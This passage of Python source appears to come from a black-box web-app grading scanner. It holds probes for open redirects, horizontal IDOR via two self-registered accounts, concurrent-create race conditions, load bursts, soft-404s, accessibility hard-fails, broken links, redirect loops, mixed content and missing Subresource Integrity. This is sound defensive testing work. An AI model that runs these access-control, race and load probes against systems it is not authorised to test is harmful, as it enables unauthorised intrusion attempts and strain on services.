        for path in list(ctx.profile.routes) + guesses:
            if path in seen:
                continue
            seen.add(path)
            try:
                resp = c.get(path, params=evil)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if resp.is_redirect and urllib.parse.urlparse(
                    resp.headers.get("location", "")).hostname == _REDIRECT_PROBE_HOST:
                ctx.evidence.update(vulnerable=True, endpoint=path, external_host=True,
                                    auth_flow=any(k in path.lower() for k in ("oauth", "authorize", "sso", "login")),
                                    repro=_repro_from_resp(resp, matched="Location: " + resp.headers.get("location", "")))
                return True
    ctx.evidence.update(vulnerable=False, endpoints_tested=len(seen))
    return False


def idor_horizontal(ctx, probe) -> bool | None:
    """Self-as-oracle: register A and B, A creates a resource, B fetches it by URL. If B can read
    A's content, object-level access control is broken (horizontal IDOR). N/A when we can't register
    both accounts or A can't create a distinct resource to test against (not a false clean)."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create form to seed a resource A owns"
        return None
    a, b = _two_accounts(ctx)
    if a is None:
        return None
    # extract each session cookie (jar iteration avoids CookieConflict) and re-send it plainly, so an
    # authed create/read isn't dropped over http when the app sets a Secure cookie (that's tested by
    # sec-session-003, separately). Same approach race_resource_ids already uses. Carry the Authorization
    # header too — the bolt/Supabase/Firebase cohort authenticates by Bearer token, not a cookie, so a
    # cookie-only re-send would run the create/read anonymously and read a false N/A.
    a_cookies = {c.name: c.value for c in a.client.cookies.jar}
    b_cookies = {c.name: c.value for c in b.client.cookies.jar}
    a_auth = {k: v for k, v in a.client.headers.items() if k.lower() == "authorization"}
    b_auth = {k: v for k, v in b.client.headers.items() if k.lower() == "authorization"}
    try:
        marker = "hl-idor-7a3f9c"
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, follow_redirects=True,
                          cookies=a_cookies, headers=a_auth) as ac:
            resource = ac.post(form.action, data={n: marker for n in form.fields}).url.path
        if not resource or resource == form.action:  # no distinct resource created -> couldn't test
            ctx.evidence["na_reason"] = "create didn't yield a distinct per-resource URL (SPA client-render)"
            return None
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, cookies=b_cookies, headers=b_auth) as bc:
            leaked = bc.get(resource)
        cross = leaked.status_code == 200 and marker in leaked.text
        ctx.evidence.update(cross_read=cross, cross_user_read=cross, resource=resource)   # v2 severity flag
        return cross
    except (httpx.HTTPError, httpx.InvalidURL):
        return None
    finally:
        a.client.close()
        b.client.close()


def _fanout(work, n: int):
    """Run `work` (a no-arg callable) n times concurrently; return the n results in submit order.
    The shared concurrency primitive for the self-as-oracle race/load probes."""
    with ThreadPoolExecutor(max_workers=n) as ex:
        return [f.result() for f in [ex.submit(work) for _ in range(n)]]


def _concurrent_creates(base_url, path, cookies, data, n: int = 12):
    def create():
        try:
            with httpx.Client(base_url=base_url, timeout=10.0, follow_redirects=True, cookies=cookies) as c:
                return c.post(path, data=data).url.path
        except Exception:
            return None
    return _fanout(create, n)


_RESOURCE_ID = re.compile(r"/(?:\d+|[0-9a-f]{6,})/?$", re.I)   # path ends in a numeric or hex/uuid id segment


def _resource_shaped(u: str, action: str) -> bool:
    """True when `u` is a PER-RESOURCE URL (a create landed on /notes/1), not a fixed landing page. A real
    id-allocation race is only observable when creates expose distinct ids; a redirect to a shared success
    page (/home, /dashboard) exposes none. It tells a catastrophic all-collide race (every create ->
    /notes/1, which IS a real race) apart from a fixed success-page redirect (every create -> /home, which
    is not). Match a sub-path of the create endpoint, or a trailing numeric/hex id."""
    a = action.rstrip("/")
    return (u.startswith(a + "/") and len(u) > len(a) + 1) or bool(_RESOURCE_ID.search(u))


def race_resource_ids(ctx, probe) -> bool | None:
    """Self-as-oracle: register, then fire N concurrent resource creates and inspect the assigned IDs,
    REPEATED across a few bursts. A duplicate id WITHIN a burst means id allocation isn't atomic under
    concurrency — a race. A correct (atomic) app never collides, so a race is intent-independent slop; but
    a race is probabilistic, so a single burst flip-flops the score on re-grade. We require the collision
    to REPRODUCE across bursts (>= min_collisions) — a strong race fires every re-grade, a marginal one
    reads clean every re-grade, which is the computational-reproducibility the score needs. We also require
    a PARTIAL collision (some ids distinct AND some duplicated): if EVERY create returns the same path, the
    app just doesn't use per-resource URLs (a fixed success-page redirect), which is not observable as a
    race — read N/A, never a phantom fire. N/A too when there's no create form or we can't self-register."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        ctx.evidence["na_reason"] = "no create form to race"
        return None
    account = ctx.register(suffix="_race")
    if account is None:
        ctx.evidence["na_reason"] = "self-registration not reachable black-box (SDK/email-confirm/captcha signup)"
        return None
    bursts = probe.probe.get("bursts", 3)
    need = probe.probe.get("min_collisions", 2)   # repeated collision -> a reproducible fire
    try:
        # iterate the jar, not dict(cookies) — dict() raises httpx.CookieConflict when the session
        # cookie was set on multiple paths/domains during the register redirect chain.
        cookies = {c.name: c.value for c in account.client.cookies.jar}
        # fill the form's ACTUAL fields (was hardcoded {"text": ...}); a real create form named
        # content/body/title would otherwise get an empty POST and the race would never be detected.
        data = {f: "hl-race" for f in form.fields}
        observed_ids = False   # did we EVER see per-resource URLs to compare (otherwise: can't observe ids)
        collided = 0           # bursts that showed an id collision (the race signature)
        for _ in range(bursts):
            urls = _concurrent_creates(ctx.base_url, form.action, cookies, data)
            # count only PER-RESOURCE URLs. A create landing on /notes/1 exposes an id to compare; one that
            # redirects to the form action or a fixed landing (login/error/dashboard) exposes none, so
            # uniform landings can't look like a race. This is what tells a real all-collide race (every
            # create -> /notes/1) apart from a fixed success-page redirect (every create -> /home).
            created = [u for u in urls if u and u != form.action
                       and not any(h in u.lower() for h in _CSRF_REJECT_HINTS)
                       and _resource_shaped(u, form.action)]
            if len(created) < 2:
                continue
            observed_ids = True
            if len(set(created)) < len(created):   # fewer distinct ids than creates -> a race this burst
                collided += 1
        if not observed_ids:
            ctx.evidence["na_reason"] = "creates don't expose per-resource URLs to compare (SPA client-render / fixed redirect)"
            return None   # never saw per-resource ids to compare (fixed redirect / <2 creates) -> couldn't test
        ctx.evidence.update(bursts=bursts, collided_bursts=collided, min_collisions=need)
        return collided >= need
    finally:
        account.client.close()


def _concurrent_create_ids(base_url, path, cookies, base_body, headers=None, n: int = 8):
    """Fire n concurrent JSON POST-creates; return each response's assigned id (or None). The JSON-API analog
    of _concurrent_creates (which compares redirect URLs) — here the id comes from the response body. Each
    create gets a slightly-distinct body so a unique-column constraint can't mask the id-allocation race."""
    def create():
        body = {k: (v + secrets.token_hex(2) if isinstance(v, str) else v) for k, v in base_body.items()}
        try:
            with httpx.Client(base_url=base_url, timeout=12.0, follow_redirects=True,
                              cookies=cookies, headers=headers, verify=False) as c:
                r = c.post(path, json=body)
                return _created_id(r) if r.status_code in (200, 201) else None
        except Exception:
            return None
    return _fanout(create, n)


def race_resource_ids_api(ctx, probe) -> bool | None:
    """Race on a JSON API — the SPA shape race_resource_ids can't see (creates are JSON fetches, not form-POST
    redirects, so there's no per-resource URL to compare). Fire N concurrent POST-creates and inspect the ids
    the RESPONSES assign; a duplicate id across concurrent creates means id allocation isn't atomic -> a race.
    Reproduced across bursts (>= min_collisions) for computational reproducibility. N/A when there's no JSON
    create endpoint, self-registration isn't reachable, or creates don't return comparable ids (UUID/opaque ->
    no observable collision). Variant group race-id-alloc with qa-race-001 -> one race finding."""
    creates = [e for e in ctx.profile.endpoints if e.method.lower() == "post" and e.body_fields]
    if not creates:
        ctx.evidence["na_reason"] = "no JSON create endpoint to race"
        return None
    account = ctx.register(suffix="_race")
    if account is None:
        ctx.evidence["na_reason"] = "self-registration not reachable black-box (SDK/email-confirm/captcha signup)"
        return None
    bursts = probe.probe.get("bursts", 3)
    need = probe.probe.get("min_collisions", 2)
    ep = creates[0]
    base_body = {f: "hl-race" for f in ep.body_fields}
    try:
        cookies = {c.name: c.value for c in account.client.cookies.jar}
        authz = account.client.headers.get("Authorization")
        hdrs = {"Authorization": authz} if authz else None
        observed_ids = False
        collided = 0
        for _ in range(bursts):
            ids = [i for i in _concurrent_create_ids(ctx.base_url, ep.path, cookies, base_body, headers=hdrs, n=8)
                   if i is not None]
            if len(ids) < 2:
                continue   # <2 creates returned an id this burst -> nothing to compare
            observed_ids = True
            if len(set(ids)) < len(ids):   # a duplicate id among concurrent creates -> non-atomic allocation
                collided += 1
        if not observed_ids:
            ctx.evidence["na_reason"] = "creates don't return comparable ids (UUID/opaque id, or no id in response)"
            return None
        ctx.evidence.update(bursts=bursts, collided_bursts=collided, min_collisions=need)
        return collided >= need
    finally:
        account.client.close()


def _concurrent_get(base_url, path, n: int = 20, headers=None):
    def get():
        try:
            with make_client(base_url, headers, timeout=15.0) as c:
                return c.get(path).status_code
        except Exception:
            return None
    return _fanout(get, n)


def load_resilience(ctx, probe) -> bool:
    """Fire a concurrent burst at an endpoint; slop if it falls over (>10% 5xx) under load — the
    resource-exhaustion / unsynchronized-shared-state failure that only surfaces under concurrency."""
    target = _home_path(ctx, probe)
    if not _served(ctx, target):
        # declared endpoint not served (real app) -> burst the homepage, the representative
        # always-present endpoint. NEVER fan across all routes: concurrent bursts at every endpoint
        # of a live target is a DoS.
        target = _landing(ctx)
    ratios, saw_5xx = [], False
    for _ in range(3):  # median of N bursts, not one: a target near the 10% gate flips between runs
        statuses = _concurrent_get(ctx.base_url, target, headers=ctx.headers)
        if statuses:
            # None = connection refused/dropped/timeout — a HARDER fall-over than a 500, counted over
            # the whole burst so an app that crashes the connection can't read cleaner than one that 500s.
            saw_5xx = saw_5xx or any(s is not None and s >= 500 for s in statuses)   # a hard fault, not just a drop
            failures = sum(1 for s in statuses if s is None or s >= 500)
            ratios.append(failures / len(statuses))
    if not ratios:
        return False
    med = statistics.median(ratios)
    ctx.evidence.update(fail_ratio=round(med, 3), threshold=0.1, observed_5xx=saw_5xx, target=target)
    return med > 0.1






_SOFT404_EXT = (".js", ".css", ".png", ".webp", ".svg", ".woff2")


def http_soft_404(ctx, probe) -> bool:
    """A missing STATIC ASSET returns a 2xx shell instead of a 4xx: a catch-all (usually an SPA serving
    index.html for everything) so caches, crawlers and monitors treat a nonexistent URL as real content.
    Using a *typed asset* path keeps this SPA-safe (the `/route -> 200 index` rewrite is intended, not flagged).
    Redirects are NOT followed: a 3xx to a login is an auth gate, not a soft-404.

    OFF-SCORE (report_only) by default: the tested path is RANDOM, so it fires on the platform-recommended SPA
    fallback (its own tp_definition's named non-defect), not an observed operative harm; and the real broken-asset
    case -- an APP-REFERENCED bundle chunk served the shell instead of JS -- is scored by qa-chunk-001
    (dead_bundle_chunk). Kept as a visible diagnostic. report_only -> penalty_override 0."""
    token = "hlnope" + secrets.token_hex(5)          # a unique random name that cannot be a real file
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        for ext in _SOFT404_EXT:
            try:
                r = c.get("/%s%s" % (token, ext))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if 200 <= r.status_code < 300:
                # A soft-404 is the app SHELL served for a nonexistent asset (an SPA catch-all serving
                # index.html). A GENERATED 200 image/svg/font from a root dynamic-asset route (avatar /
                # OG-image / placeholder answering /<anything>.svg|.png) is a REAL asset, not a soft-404:
                # require the 2xx to be the HTML shell — consistent with the discovery-side catch-all
                # detectors, which also gate on "html" in content-type — and, when the root-shell
                # signature is computable, require the body to match it.
                if "html" not in r.headers.get("content-type", "").lower():
                    continue                         # a generated image/svg/font asset -> not a soft-404 shell
                sig = _catch_all_sig(ctx)
                if sig and _body_sig(r.text) != sig:
                    continue                         # HTML, but not the root shell the host serves everywhere
                ctx.evidence.update(soft_404=True, ext=ext, status=r.status_code)
                if probe.probe.get("report_only"):
                    ctx.evidence.update(report_only=True, penalty_override=0)   # off-score diagnostic
                return True                          # a catch-all shell for a missing asset -> soft-404
    ctx.evidence.update(soft_404=False, exts_tested=len(_SOFT404_EXT))
    return False


# Accessibility hard-fails — the OBJECTIVE, pass/fail subset of WCAG (an accessible name / lang / title /
# alt is present, and the contrast-ratio MATH), all readable from static HTML with no browser. Not the
# judgment calls (is the alt text meaningful, is the tab order sane) — only the unambiguous fails. All
# collapse to ONE "the page has accessibility hard-fails" finding (variant-grouped with the browser probe).
_A11Y_NAMED_ATTR = ("aria-label", "aria-labelledby", "title")
_LABELABLE = re.compile(r"<(input|select|textarea)\b([^>]*)>", re.IGNORECASE)
_SKIP_INPUT_TYPES = ("hidden", "submit", "button", "image", "reset")
# Only VISIBLE, rendered markup can host an accessibility barrier. A string that merely LOOKS like an
# <img>/<input>/inline-style but lives inside an inlined JS bundle, a JSON-LD blob, a <template>/<noscript>,
# or an HTML comment is never rendered, so scanning it false-fires (img-missing-alt is the most exposed).
# Strip those regions before the img / control-name / inline-contrast checks; the <html lang> and <title>
# checks still read the full document (they live in <head>, outside these regions).
_A11Y_NONVISIBLE = re.compile(
    r"<script\b[^>]*>.*?</script>|<style\b[^>]*>.*?</style>|<template\b[^>]*>.*?</template>|"
    r"<noscript\b[^>]*>.*?</noscript>|<!--.*?-->",
    re.IGNORECASE | re.DOTALL)
_NAMED_COLORS = {"black": (0, 0, 0), "white": (255, 255, 255), "red": (255, 0, 0), "lime": (0, 255, 0),
                 "green": (0, 128, 0), "blue": (0, 0, 255), "gray": (128, 128, 128), "grey": (128, 128, 128),
                 "silver": (192, 192, 192), "yellow": (255, 255, 0), "navy": (0, 0, 128), "maroon": (128, 0, 0)}


def _tag_attr(name, tag):
    return re.search(r"\b" + name + r"""\s*=\s*["']?([^"'>\s]+)""", tag, re.IGNORECASE)


def _parse_color(s):
    s = s.strip().lower()
    m = re.match(r"rgba?\(\s*(\d+)\s*,\s*(\d+)\s*,\s*(\d+)", s)
    if m:
        return int(m.group(1)), int(m.group(2)), int(m.group(3))
    tok = s.split()[0] if s.split() else ""
    if tok in _NAMED_COLORS:
        return _NAMED_COLORS[tok]
    m = re.match(r"#([0-9a-f]{3}|[0-9a-f]{6})\b", tok)
    if m:
        h = m.group(1)
        if len(h) == 3:
            h = "".join(ch * 2 for ch in h)
        return int(h[0:2], 16), int(h[2:4], 16), int(h[4:6], 16)
    return None


def _contrast_ratio(fg, bg):
    def _lin(rgb):
        def chan(c):
            c /= 255.0
            return c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4
        return 0.2126 * chan(rgb[0]) + 0.7152 * chan(rgb[1]) + 0.0722 * chan(rgb[2])
    l1, l2 = _lin(fg), _lin(bg)
    return (max(l1, l2) + 0.05) / (min(l1, l2) + 0.05)   # WCAG 2.x contrast ratio


def a11y_hard_fails(ctx, probe) -> bool | None:
    """Parse the homepage HTML for objective WCAG hard-fails with no browser: <html> without lang
    (3.1.1), <img> without alt (1.1.1), a form control with no accessible name (4.1.2/3.3.2), a
    missing/empty <title> (2.4.2), and inline-styled text below the universal 3:1 contrast floor (1.4.3,
    the ratio math). Each DISTINCT hard-fail contributes its severity tier to a SUM (see _a11y_penalty /
    _STATIC_A11Y_IMPACT), matching the browser axe probe's model so a multi-barrier page outscores a
    single-barrier one and the score doesn't jump when the browser is on vs off. N/A on a non-HTML page."""
    # DEFER TO AXE when the browser ran. qa-a11y-001 (axe on the RENDERED DOM) covers the SAME flaw (shared
    # variant_group_id) and is authoritative; this static pre-JS-HTML pass is blind to CSS-hidden and JS-labeled
    # controls, so it over-reports control-no-accessible-name -- and because the variant group scores the MAX of
    # its members, that inflated value OVERRODE axe's accurate lower one (+1093 pts across ~88 v18 hosts). So
    # this is a browser-OFF FALLBACK only: when axe ran, read N/A rather than double-count / override it.
    if ctx.profile.capabilities.get("browser"):
        ctx.evidence["na_reason"] = "browser ran -> axe (qa-a11y-001) on the rendered DOM is authoritative"
        return None
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    doc = r.text
    visible = _A11Y_NONVISIBLE.sub(" ", doc)                       # non-rendered regions can't host a barrier
    fails: list[str] = []                                         # every distinct barrier, not the first
    m = re.search(r"<html\b([^>]*)>", doc, re.IGNORECASE)          # 1. <html> missing lang (full doc)
    if m and not re.search(r"\blang\s*=", m.group(1), re.IGNORECASE):
        fails.append("missing-lang")
    if any(not re.search(r"\balt\s*=", tag, re.IGNORECASE)        # 2. <img> missing alt (rendered only)
           for tag in re.findall(r"<img\b[^>]*>", visible, re.IGNORECASE)):
        fails.append("img-missing-alt")
    tm = re.search(r"<title\b[^>]*>(.*?)</title>", doc, re.IGNORECASE | re.DOTALL)  # 3. missing/empty <title> (full doc)
    if not tm or not tm.group(1).strip():
        fails.append("missing-title")
    label_fors = set(re.findall(r"""<label\b[^>]*\bfor\s*=\s*["']?([^"'>\s]+)""", visible, re.IGNORECASE))
    label_spans = [(mm.start(), mm.end())                          # 4. control with no accessible name (rendered only)
                   for mm in re.finditer(r"<label\b.*?</label>", visible, re.IGNORECASE | re.DOTALL)]
    for mm in _LABELABLE.finditer(visible):
        attrs = mm.group(2)
        tt = _tag_attr("type", attrs)
        if mm.group(1).lower() == "input" and tt and tt.group(1).lower() in _SKIP_INPUT_TYPES:
            continue
        if any(re.search(r"\b" + a + r"\s*=", attrs, re.IGNORECASE) for a in _A11Y_NAMED_ATTR):
            continue
        idm = _tag_attr("id", attrs)
        if idm and idm.group(1) in label_fors:
            continue
        if any(s <= mm.start() < e for s, e in label_spans):
            continue
        fails.append("control-no-accessible-name")
        break                                                     # one unlabeled control -> the barrier exists
    for mm in re.finditer(r"""<([a-z0-9]+)\b[^>]*\bstyle\s*=\s*["']([^"']*)["'][^>]*>(.*?)</\1>""",
                          visible, re.IGNORECASE | re.DOTALL):     # 5. inline-style contrast < 3:1 floor (rendered only)
        style = mm.group(2)
        if not re.sub(r"<[^>]+>", "", mm.group(3)).strip():
            continue
        cm = re.search(r"(?<!-)\bcolor\s*:\s*([^;]+)", style, re.IGNORECASE)
        bm = re.search(r"background(?:-color)?\s*:\s*([^;]+)", style, re.IGNORECASE)
        if cm and bm:
            fg, bg = _parse_color(cm.group(1)), _parse_color(bm.group(1))
            if fg and bg and _contrast_ratio(fg, bg) < 3.0:
                fails.append("low-contrast")
                break
    if not fails:
        ctx.evidence.update(fails=[])   # all objective WCAG hard-fails passed
        return False
    impacts: dict[str, int] = {}
    for f in fails:
        lvl = _STATIC_A11Y_IMPACT.get(f, "serious")
        impacts[lvl] = impacts.get(lvl, 0) + 1
    ctx.evidence.update(fails=fails, impacts=impacts, penalty_override=_a11y_penalty(impacts))
    return True


# Broken links — an internal <a href> that leads to a 4xx is a dead end in the user's journey. Fire on
# 4xx only (a missing/forbidden destination); 5xx is a server error (crash-resistance's domain), and a
# followed redirect that lands on a real page is NOT broken.
_ANCHOR_HREF = re.compile(r"""<a\b[^>]*\bhref\s*=\s*["']([^"']+)["']""", re.IGNORECASE)


def _same_origin_links(c, ctx, probe) -> list[str] | None:
    """Same-origin <a href> paths on the homepage (deduped, the self-link + logout dropped). None when the
    target isn't HTML or has no internal links -> the caller returns N/A. Shared by the 4xx dead-link probe and
    the redirect-loop probe so both crawl the app's declared navigation identically."""
    target = _home_path(ctx, probe)
    base = urllib.parse.urlparse(ctx.base_url)
    try:
        r = c.get(target)
    except (httpx.HTTPError, httpx.InvalidURL):
        return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    links = []
    for href in _ANCHOR_HREF.findall(r.text):
        href = html.unescape(href.split("#")[0].strip())   # decode entities: `?a=1&amp;b=2` IS `?a=1&b=2` to a
        #                                                     browser -- not unescaping fetched a literal &amp; -> 400
        if not href or href.startswith(("mailto:", "tel:", "javascript:", "data:")):
            continue
        if "${" in href or "{{" in href:
            continue                                   # an UNINTERPOLATED template literal leaked into the href
            #                                            (/${s.url}, /${escapeHtml(href)}) -> a code artifact, not a link
        if "/cdn-cgi/" in href:
            continue                                   # Cloudflare-INJECTED (email-protection etc.) -> not the app's link
        if re.search(r"log[-_]?out|sign[-_]?out", href, re.IGNORECASE):
            continue                                   # never GET a logout link (would drop the session)
        t = urllib.parse.urlparse(urllib.parse.urljoin("%s://%s%s" % (base.scheme, base.netloc, target), href))
        if t.netloc == base.netloc and t.path:
            links.append(t.path + ("?" + t.query if t.query else ""))
    links = [p for p in dict.fromkeys(links) if p != target]   # dedupe, drop the self-link
    return links or None


def broken_links(ctx, probe) -> bool | None:
    """Fetch each same-origin <a href> link on the homepage; fire if one lands on a 4xx dead end. N/A
    when the page has no internal links to follow (5xx is out of scope here -> redirect_loop / crash probes)."""
    budget = probe.probe.get("max_attempts", 40)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:
        links = _same_origin_links(c, ctx, probe)
        if links is None:
            return None
        checked = links[:budget]
        dead = []
        for path in checked:
            try:
                st = c.get(path).status_code
                # a DEAD END is not-found (404/410) or a malformed request (400/414), NOT access-control:
                # 401/403 = the page exists but is gated (a login-required nav item / deployment protection), and
                # 429 = rate-limited -- the link WORKS, it isn't broken. So skip the access-control/limit statuses.
                if 400 <= st < 500 and st not in (401, 403, 429):
                    dead.append((path, st))
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
    if not checked:
        return None
    if dead:
        # SPECTRUM: score by the FRACTION of internal navigation that's a dead end -- one dead link on a big
        # site is a smaller defect than a site where half the nav 404s. Floor ~24 (any dead link), scaling to
        # ~48 (all nav dead). Was a flat 25 regardless of how broken.
        frac = len(dead) / len(checked)
        ctx.evidence.update(broken=True, dead_links=len(dead), links_checked=len(checked),
                            dead_fraction=round(frac, 2), link=dead[0][0], status=dead[0][1],
                            examples=[p for p, _ in dead[:5]],
                            penalty_override=round(24 * (1 + frac), 1))
        return True
    ctx.evidence.update(broken=False, links_checked=len(checked))
    return False


# ERR_TOO_MANY_REDIRECTS -- a route redirects without ever resolving (a self-loop, a cycle A->B->A, or an
# unbounded chain), so a browser hits its ~20-hop redirect cap and shows an error page. The route is
# unreachable for every visitor. Classic deploy causes: an auth guard that bounces / -> /login -> / when a
# session cookie can't be set, a trailing-slash loop, or a base-URL/proxy misconfig that flips http<->https.
_REDIRECT_CAP = 20   # matches the redirect limit real browsers enforce before ERR_TOO_MANY_REDIRECTS


def redirect_loop(ctx, probe) -> bool | None:
    """The homepage or a same-origin route it links to redirects endlessly (cycle or over the browser cap), so
    a visitor gets ERR_TOO_MANY_REDIRECTS instead of the page. Follows redirects manually, same-origin only
    (never chasing a redirect off-origin with the caller's auth headers); fires on a revisited URL (cycle) or on
    exceeding the browser redirect cap. N/A when no reachable entry point / links. A loop is deterministic by
    construction, so no separate reproduce gate is needed."""
    cap = probe.probe.get("max_hops", _REDIRECT_CAP)
    budget = probe.probe.get("max_attempts", 40)
    base = urllib.parse.urlparse(ctx.base_url)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        home = _home_path(ctx, probe)
        starts = [home]
        links = _same_origin_links(c, ctx, probe)
        if links is None and not starts:
            return None
        starts += (links or [])[:budget]
        reachable = False
        for start in dict.fromkeys(starts):
            url = urllib.parse.urljoin(ctx.base_url, start)
            seen: set[str] = set()
            for _ in range(cap + 1):
                if urllib.parse.urlparse(url).netloc not in ("", base.netloc):
                    break                                  # left our origin -> resolves elsewhere, not our loop
                if url in seen:                            # revisited a URL we already fetched -> cycle
                    ctx.evidence.update(loop=True, entry=start, root_loop=(start == home), hops=len(seen),
                                        reason="redirect cycle", cycle_to=urllib.parse.urlparse(url).path)
                    return True
                seen.add(url)
                try:
                    r = c.get(url)
                except (httpx.HTTPError, httpx.InvalidURL):
                    break
                reachable = True
                if not (300 <= r.status_code < 400 and "location" in r.headers):
                    break                                  # resolved to a final (non-redirect) response
                url = urllib.parse.urljoin(url, r.headers["location"])
            else:
                ctx.evidence.update(loop=True, entry=start, root_loop=(start == home), hops=cap + 1,
                                    reason="exceeded the browser redirect cap (ERR_TOO_MANY_REDIRECTS)")
                return True                                # never resolved within the cap -> unbounded chain
    ctx.evidence.update(loop=False, routes_checked=len(dict.fromkeys(starts)))
    return False if reachable else None


# Mixed content — an HTTPS page that LOADS a subresource over plain http:// . A man-in-the-middle can
# read/tamper the cleartext resource (an http:// <script> lets them own the DOM), so browsers hard-block
# active mixed content -> the page breaks. Subresources only (<script>/<img>/<link rel=stylesheet>/...),
# never <a href> (that's a navigation the user chooses, not a resource the page loads).
def _http_subresources(html: str, page_url: str) -> list[str]:
    """URLs of subresources the page loads that resolve to an insecure http:// origin. Protocol-relative
    (//host) and relative refs inherit the page's https scheme -> not mixed; only absolute http:// is."""
    refs = [m.group(2) for m in re.finditer(
        r"<(script|img|iframe|embed|audio|video|source|track)\b[^>]*\bsrc\s*=\s*[\"']([^\"']+)[\"']", html, re.I)]
    refs += re.findall(r"<object\b[^>]*\bdata\s*=\s*[\"']([^\"']+)[\"']", html, re.I)
    for m in re.finditer(r"<link\b([^>]*)>", html, re.I):     # stylesheets/preload are loaded; canonical isn't
        rel = re.search(r"\brel\s*=\s*[\"']?([^\"'>\s]+)", m.group(1), re.I)
        href = re.search(r"\bhref\s*=\s*[\"']([^\"']+)[\"']", m.group(1), re.I)
        if href and rel and rel.group(1).lower() in ("stylesheet", "preload", "prefetch", "modulepreload"):
            refs.append(href.group(1))
    insecure = [urllib.parse.urljoin(page_url, r.strip()) for r in refs]
    return list(dict.fromkeys(u for u in insecure if urllib.parse.urlparse(u).scheme == "http"))


def mixed_content(ctx, probe) -> bool | None:
    """On an HTTPS page, any subresource loaded over plain http:// is mixed content. N/A when the page
    itself isn't served over https (nothing can be 'mixed'). verify=False: a black-box grader connects to
    whatever cert the target presents (cert validity is a separate concern)."""
    if urllib.parse.urlparse(ctx.base_url).scheme != "https":
        return None
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=True) as c:  # verify=False by default
        try:
            r = c.get(_home_path(ctx, probe))
        except (httpx.HTTPError, httpx.InvalidURL):
            return None
    if "html" not in r.headers.get("content-type", "").lower():
        return None
    insecure = _http_subresources(r.text, str(r.url))
    ctx.evidence.update(mixed=bool(insecure), http_subresources=insecure[:5])
    return True if insecure else False


# v2.0 FAMILY 4 -- Subresource Integrity (SRI, a W3C recommendation). A CROSS-ORIGIN, code-executing <script src>
# / stylesheet loaded without an `integrity=` hash is an unguarded supply-chain risk: if that CDN is compromised
# or the domain is hijacked, arbitrary code runs in the app's origin with full access to its DOM, cookies, and
# tokens. Same-origin resources need no SRI (you already control them). Static: parsed from the served HTML.
#
# SRI is INAPPLICABLE to these subresource hosts, so flagging them is a false positive by DOMINANCE (not
# prevalence): font-CSS endpoints serve DIFFERENT bytes per User-Agent (the @font-face `src` varies), so a
# pinned integrity hash MISMATCHES for some browsers and BLOCKS the stylesheet -- the "fix" breaks the site; and
# tag/loader endpoints (GTM / Google Identity / gapi) publish no stable hash and bootstrap further scripts SRI on
# the loader cannot cover. Loading these WITHOUT SRI is the correct practice.
_SRI_INAPPLICABLE_HOSTS = {
    "fonts.googleapis.com", "api.fontshare.com", "use.typekit.net", "fonts.bunny.net", "use.fontawesome.com",
    "www.googletagmanager.com", "accounts.google.com", "apis.google.com",
}
# Zero-dev-control BUILDER-INJECTED asset hosts: the platform (Lovable / Framer / Wix / Softr / Gamma / Supabase)
# wrote the <script>/<link>, so the participant cannot add integrity= to a tag they did not author -> wrong
# owner, an ATTRIBUTABLE false positive. Suffix-matched, so a subdomain is covered too.
_SRI_PLATFORM_ASSET_HOSTS = {
    "gpteng.co", "framerusercontent.com", "parastorage.com", "softr-files.com",
    "gammahosted.com", "frontend-assets.supabase.com",
}


def _sri_excluded_host(host: str) -> bool:
    """A cross-origin subresource host that is NOT a scorable SRI gap: one SRI cannot protect (per-UA font CSS /
    a tag loader -- a hash breaks it), or a builder-injected asset host the participant does not own."""
    if host in _SRI_INAPPLICABLE_HOSTS:
        return True
    return any(host == s or host.endswith("." + s) for s in _SRI_PLATFORM_ASSET_HOSTS)


def _sri_scan(html: str, page_url: str) -> tuple[list[str], int]:
    """(cross-origin subresource URLs that ship WITHOUT integrity=, count of ALL SRI-APPLICABLE cross-origin such
    resources). The second value separates 'no third-party resource to protect -> N/A' from 'all protected ->
    clean'. Counts only CODE-EXECUTING cross-origin kinds -- <script src>, <link rel=stylesheet|modulepreload>,
    and <link rel=preload as=script|style> (a preloaded image/font/fetch does not execute) -- treats a sibling
    subdomain of the SAME registrable domain as first-party (PSL-aware), and excludes hosts SRI cannot protect or
    that the participant does not own (see _sri_excluded_host). <img>/<iframe> are out of scope."""
    origin_site = _registrable_domain(urllib.parse.urlparse(page_url).netloc.split(":")[0].lower())
    gaps: list[str] = []
    total = 0
    tags = [(m.group(1), "src") for m in re.finditer(r"<script\b([^>]*)>", html, re.I)]
    for m in re.finditer(r"<link\b([^>]*)>", html, re.I):
        attrs = m.group(1)
        rel = re.search(r"\brel\s*=\s*[\"']?([^\"'>\s]+)", attrs, re.I)
        if not rel:
            continue
        kind = rel.group(1).lower()
        if kind in ("stylesheet", "modulepreload"):
            tags.append((attrs, "href"))                 # a stylesheet applies / a module preload executes
        elif kind == "preload":
            as_ = re.search(r"\bas\s*=\s*[\"']?([^\"'>\s]+)", attrs, re.I)
            if as_ and as_.group(1).lower() in ("script", "style"):
                tags.append((attrs, "href"))             # a preloaded script/style executes; image/font/fetch does not
    for attrs, urlattr in tags:
        ref = re.search(r"\b" + urlattr + r"\s*=\s*[\"']([^\"']+)[\"']", attrs, re.I)
        if not ref:
            continue
        p = urllib.parse.urlparse(urllib.parse.urljoin(page_url, ref.group(1).strip()))
        if p.scheme not in ("http", "https") or not p.netloc:
            continue                                     # relative / non-http
        host = p.netloc.split(":")[0].lower()
        if _registrable_domain(host) == origin_site:
            continue                                     # first-party (same registrable domain, incl. a sibling subdomain)
        if _sri_excluded_host(host):
